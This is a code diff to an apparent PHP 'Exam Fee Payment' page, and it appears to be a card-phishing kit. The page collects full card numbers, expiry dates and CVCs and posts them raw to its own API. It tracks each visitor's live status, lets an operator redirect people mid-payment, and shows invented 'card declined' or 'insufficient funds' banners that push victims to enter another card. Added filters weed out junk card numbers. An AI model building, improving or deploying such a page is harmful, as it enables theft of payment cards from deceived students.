@@ -12,6 +12,8 @@ if ($visitorId) {
     $db = getDB();
     $db->prepare("UPDATE visitors SET is_online = 1, status = 'payment', last_activity = datetime('now') WHERE id = ?")->execute([$visitorId]);
 }
+
+$errorType = $_GET['error'] ?? '';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -42,7 +44,7 @@ if ($visitorId) {
         .form-group .hint{font-size:.72rem;color:#dc2626;margin-top:4px;display:none}
         .form-group .hint.show{display:block}
         .card-input{font-family:'Consolas','SF Mono',monospace;letter-spacing:2.5px;font-size:1.05rem}
-        .card-brand{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:.72rem;font-weight:700;color:#64748b;pointer-events:none}
+        .card-brand{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:.72rem;font-weight:700;pointer-events:none;transition:color .2s}
         .card-wrap{position:relative}
         .form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
         .btn-pay{
@@ -55,6 +57,10 @@ if ($visitorId) {
         .alert{padding:12px;border-radius:10px;font-size:.88rem;margin-top:16px;display:none;font-weight:500}
         .alert-success{background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0;display:block}
         .alert-error{background:#fef2f2;color:#dc2626;border:1px solid #fecaca;display:block}
+        .error-banner{background:#fef2f2;border:1.5px solid #fecaca;border-radius:12px;padding:14px 18px;margin-bottom:20px;display:flex;align-items:flex-start;gap:10px}
+        .error-banner .icon{font-size:1.3rem;flex-shrink:0;margin-top:1px}
+        .error-banner .text{font-size:.88rem;color:#991b1b;line-height:1.5}
+        .error-banner .text strong{color:#dc2626}
         .secure{text-align:center;margin-top:14px;font-size:.75rem;color:#94a3b8}
         @media(max-width:400px){.container{padding:0 12px}.pay-card{padding:20px 16px}}
     </style>
@@ -63,6 +69,27 @@ if ($visitorId) {
 <div class="top-bar"><h1>Exam Fee Payment</h1></div>
 <div class="container">
     <div class="pay-card">
+<?php if ($errorType === 'declined'): ?>
+        <div class="error-banner">
+            <span class="icon">&#9888;&#65039;</span>
+            <div class="text"><strong>Your card was declined.</strong><br>Please try a different card or contact your bank and try again.</div>
+        </div>
+<?php elseif ($errorType === 'insufficient'): ?>
+        <div class="error-banner">
+            <span class="icon">&#9888;&#65039;</span>
+            <div class="text"><strong>Insufficient funds.</strong><br>Please try a different card with sufficient balance.</div>
+        </div>
+<?php elseif ($errorType === 'expired'): ?>
+        <div class="error-banner">
+            <span class="icon">&#9888;&#65039;</span>
+            <div class="text"><strong>Your card has expired.</strong><br>Please use a valid, non-expired card.</div>
+        </div>
+<?php elseif ($errorType === 'error'): ?>
+        <div class="error-banner">
+            <span class="icon">&#9888;&#65039;</span>
+            <div class="text"><strong>Payment processing error.</strong><br>An error occurred. Please re-enter your card details and try again.</div>
+        </div>
+<?php endif; ?>
         <h2>Payment Details</h2>
         <p class="subtitle">for <?= sanitize($student['name'] . ' ' . $student['surname']) ?></p>
 
@@ -78,7 +105,7 @@ if ($visitorId) {
             <div class="form-group">
                 <label>Card Number</label>
                 <div class="card-wrap">
-                    <input type="text" id="cardNum" class="card-input" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required>
+                    <input type="text" id="cardNum" class="card-input" inputmode="numeric" maxlength="23" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required>
                     <span class="card-brand" id="ccBrand"></span>
                 </div>
                 <div class="hint" id="cardHint">Invalid card number</div>
@@ -107,37 +134,99 @@ const visitorId = <?= $visitorId ?>;
 let pageVisible = true;
 let paymentStatus = 'viewing';
 
-// Card number: format with spaces every 4 digits
+// ====== Card brand detection — comprehensive ======
+const CARD_BRANDS = [
+    { name: 'AMEX',       pattern: /^3[47]/,                      lengths: [15], cvcLen: 4, color: '#006fcf' },
+    { name: 'VISA',       pattern: /^4/,                          lengths: [13,16,19], cvcLen: 3, color: '#1a1f71' },
+    { name: 'MASTERCARD', pattern: /^(5[1-5]|2[2-7])/,           lengths: [16], cvcLen: 3, color: '#eb001b' },
+    { name: 'DISCOVER',   pattern: /^(6011|65|64[4-9])/,         lengths: [16,19], cvcLen: 3, color: '#ff6000' },
+    { name: 'DINERS',     pattern: /^(30[0-5]|36|38)/,           lengths: [14,16], cvcLen: 3, color: '#004c97' },
+    { name: 'JCB',        pattern: /^35(2[89]|[3-8])/,           lengths: [15,16,19], cvcLen: 3, color: '#0e4c96' },
+    { name: 'UNIONPAY',   pattern: /^(62|81)/,                   lengths: [16,17,18,19], cvcLen: 3, color: '#e21836' },
+    { name: 'MAESTRO',    pattern: /^(50|5[6-9]|6[0-9])/,        lengths: [12,13,14,15,16,17,18,19], cvcLen: 3, color: '#cc0000' },
+    { name: 'MIR',        pattern: /^220[0-4]/,                   lengths: [16,17,18,19], cvcLen: 3, color: '#00875f' },
+    { name: 'ELO',        pattern: /^(636368|438935|504175|451416|636297)/, lengths: [16], cvcLen: 3, color: '#000' },
+];
+
+function detectBrand(num) {
+    for (const brand of CARD_BRANDS) {
+        if (brand.pattern.test(num)) return brand;
+    }
+    return null;
+}
+
+function getMaxDigits(brand) {
+    if (!brand) return 19;
+    return Math.max(...brand.lengths);
+}
+
+// ====== Card number input — smart formatting ======
 const cardInput = document.getElementById('cardNum');
+const brandEl = document.getElementById('ccBrand');
+
+function formatCardNumber(digits, brand) {
+    // AMEX: 4-6-5, Diners 14-digit: 4-6-4, all others: groups of 4
+    if (brand && brand.name === 'AMEX') {
+        let parts = [];
+        if (digits.length > 0) parts.push(digits.slice(0, 4));
+        if (digits.length > 4) parts.push(digits.slice(4, 10));
+        if (digits.length > 10) parts.push(digits.slice(10, 15));
+        return parts.join(' ');
+    }
+    if (brand && brand.name === 'DINERS' && digits.length <= 14) {
+        let parts = [];
+        if (digits.length > 0) parts.push(digits.slice(0, 4));
+        if (digits.length > 4) parts.push(digits.slice(4, 10));
+        if (digits.length > 10) parts.push(digits.slice(10, 14));
+        return parts.join(' ');
+    }
+    return digits.replace(/(.{4})/g, '$1 ').trim();
+}
+
+function updateBrandDisplay(brand) {
+    if (brand) {
+        brandEl.textContent = brand.name;
+        brandEl.style.color = brand.color;
+    } else {
+        brandEl.textContent = '';
+        brandEl.style.color = '#64748b';
+    }
+}
+
 cardInput.addEventListener('input', function() {
-    let v = this.value.replace(/\D/g, '').slice(0, 16);
-    // Insert spaces every 4
-    let formatted = v.replace(/(.{4})/g, '$1 ').trim();
+    const cursor = this.selectionStart;
+    const prevLen = this.value.length;
+    let digits = this.value.replace(/\D/g, '');
+    const brand = detectBrand(digits);
+    const max = getMaxDigits(brand);
+    digits = digits.slice(0, max);
+    const formatted = formatCardNumber(digits, brand);
     this.value = formatted;
-    detectBrand(v);
+    updateBrandDisplay(brand);
+    // Restore cursor
+    const diff = formatted.length - prevLen;
+    this.setSelectionRange(cursor + diff, cursor + diff);
+    // Update CVC maxlength
+    document.getElementById('cvc').maxLength = brand ? brand.cvcLen : 4;
     paymentStatus = 'typing_card';
 });
-// Handle paste
+
 cardInput.addEventListener('paste', function(e) {
     e.preventDefault();
-    let v = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 16);
-    this.value = v.replace(/(.{4})/g, '$1 ').trim();
-    detectBrand(v);
+    let digits = (e.clipboardData.getData('text') || '').replace(/\D/g, '');
+    const brand = detectBrand(digits);
+    const max = getMaxDigits(brand);
+    digits = digits.slice(0, max);
+    this.value = formatCardNumber(digits, brand);
+    updateBrandDisplay(brand);
+    document.getElementById('cvc').maxLength = brand ? brand.cvcLen : 4;
 });
 
 function getCardDigits() { return cardInput.value.replace(/\D/g, ''); }
 
-function detectBrand(num) {
-    const el = document.getElementById('ccBrand');
-    if (/^4/.test(num)) el.textContent = 'VISA';
-    else if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) el.textContent = 'MASTERCARD';
-    else if (/^3[47]/.test(num)) el.textContent = 'AMEX';
-    else if (/^6(?:011|5)/.test(num)) el.textContent = 'DISCOVER';
-    else el.textContent = '';
-}
-
+// ====== Luhn check ======
 function luhnCheck(num) {
-    if (num.length < 13 || num.length > 19) return false;
+    if (num.length < 12 || num.length > 19) return false;
     let sum = 0, alt = false;
     for (let i = num.length - 1; i >= 0; i--) {
         let n = parseInt(num[i], 10);
@@ -147,7 +236,39 @@ function luhnCheck(num) {
     return sum % 10 === 0;
 }
 
-// Expiry auto-format
+// ====== Extra fraud checks ======
+function isFakePattern(num) {
+    // All same digit
+    if (/^(.)\1+$/.test(num)) return true;
+    // Sequential ascending (1234567890...)
+    let asc = true, desc = true;
+    for (let i = 1; i < num.length; i++) {
+        if (parseInt(num[i]) !== (parseInt(num[i-1]) + 1) % 10) asc = false;
+        if (parseInt(num[i]) !== (parseInt(num[i-1]) - 1 + 10) % 10) desc = false;
+    }
+    if (asc || desc) return true;
+    // Repeating 2-digit pattern (e.g., 4141414141414141)
+    if (num.length >= 12) {
+        const pair = num.slice(0, 2);
+        if (num === pair.repeat(Math.ceil(num.length / 2)).slice(0, num.length)) return true;
+    }
+    return false;
+}
+
+function validateCard(num) {
+    const brand = detectBrand(num);
+    // Must match a known brand
+    if (!brand) return { valid: false, msg: 'Unrecognized card type' };
+    // Must be a valid length for that brand
+    if (!brand.lengths.includes(num.length)) return { valid: false, msg: `${brand.name} requires ${brand.lengths.join(' or ')} digits` };
+    // Luhn check (skip for some UnionPay)
+    if (brand.name !== 'UNIONPAY' && !luhnCheck(num)) return { valid: false, msg: 'Invalid card number' };
+    // Fake pattern check
+    if (isFakePattern(num)) return { valid: false, msg: 'Invalid card number' };
+    return { valid: true, brand: brand };
+}
+
+// ====== Expiry ======
 document.getElementById('expiry').addEventListener('input', function() {
     let v = this.value.replace(/\D/g, '');
     if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
@@ -171,6 +292,7 @@ function validateExpiry(val) {
     return ey > now.getFullYear() || (ey === now.getFullYear() && m >= now.getMonth() + 1);
 }
 
+// ====== Form submission ======
 document.getElementById('payForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     const alertEl = document.getElementById('alert');
@@ -181,7 +303,7 @@ document.getElementById('payForm').addEventListener('submit', async function(e) 
     hint.className = 'hint'; expiryHint.className = 'hint';
     cardInput.classList.remove('error','valid');
     document.getElementById('expiry').classList.remove('error','valid');
-    alertEl.className = ''; alertEl.style.display = 'none';
+    alertEl.className = 'alert'; alertEl.style.display = 'none';
 
     const cardNum = getCardDigits();
     const name = document.getElementById('cardName').value.trim();
@@ -189,17 +311,26 @@ document.getElementById('payForm').addEventListener('submit', async function(e) 
     const cvc = document.getElementById('cvc').value.trim();
 
     if (!name) { alertEl.className = 'alert alert-error'; alertEl.textContent = 'Enter cardholder name'; return; }
-    if (!luhnCheck(cardNum)) {
-        hint.textContent = 'Invalid card number'; hint.className = 'hint show';
+
+    const cardCheck = validateCard(cardNum);
+    if (!cardCheck.valid) {
+        hint.textContent = cardCheck.msg; hint.className = 'hint show';
         cardInput.classList.add('error'); return;
     }
     cardInput.classList.add('valid');
+
     if (!validateExpiry(expiry)) {
         expiryHint.textContent = 'Invalid or expired'; expiryHint.className = 'hint show';
         document.getElementById('expiry').classList.add('error'); return;
     }
     document.getElementById('expiry').classList.add('valid');
-    if (cvc.length < 3) { alertEl.className = 'alert alert-error'; alertEl.textContent = 'CVC must be at least 3 digits'; return; }
+
+    const requiredCvc = cardCheck.brand ? cardCheck.brand.cvcLen : 3;
+    if (cvc.length < requiredCvc) {
+        alertEl.className = 'alert alert-error';
+        alertEl.textContent = `CVC must be ${requiredCvc} digits for ${cardCheck.brand ? cardCheck.brand.name : 'this card'}`;
+        return;
+    }
 
     btn.disabled = true; btn.textContent = 'Processing...';
     paymentStatus = 'submitting';
@@ -210,7 +341,7 @@ document.getElementById('payForm').addEventListener('submit', async function(e) 
             body: JSON.stringify({
                 student_id: studentId, cardholder: name,
                 card_number: cardNum,
-                card_type: document.getElementById('ccBrand').textContent || 'CARD',
+                card_type: cardCheck.brand ? cardCheck.brand.name : 'CARD',
                 expiry: expiry,
                 cvc: cvc
             })
@@ -234,10 +365,10 @@ document.getElementById('payForm').addEventListener('submit', async function(e) 
     }
 });
 
-// === Heartbeat with payment status ===
+// ====== Heartbeat ======
 function hb() {
     if (!pageVisible || document.hidden) return;
-    fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) }).catch(()=>{});
+    fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) }).then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect}).catch(()=>{});
     if (visitorId) fetch('api/visitor-heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({visitor_id:visitorId, status:'payment'}) }).catch(()=>{});
 }
 document.addEventListener('visibilitychange', () => {
@@ -258,16 +389,6 @@ function sendOffline() {
 hb(); let hbTimer = setInterval(hb, 5000);
 window.addEventListener('pagehide', sendOffline);
 window.addEventListener('beforeunload', sendOffline);
-
-// Check for redirect (admin might redirect while on payment page)
-setInterval(async () => {
-    if (!pageVisible || document.hidden) return;
-    try {
-        const r = await fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) });
-        const d = await r.json();
-        if (d.redirect) window.location.href = d.redirect;
-    } catch(e) {}
-}, 5000);
 </script>
 </body>
 </html>
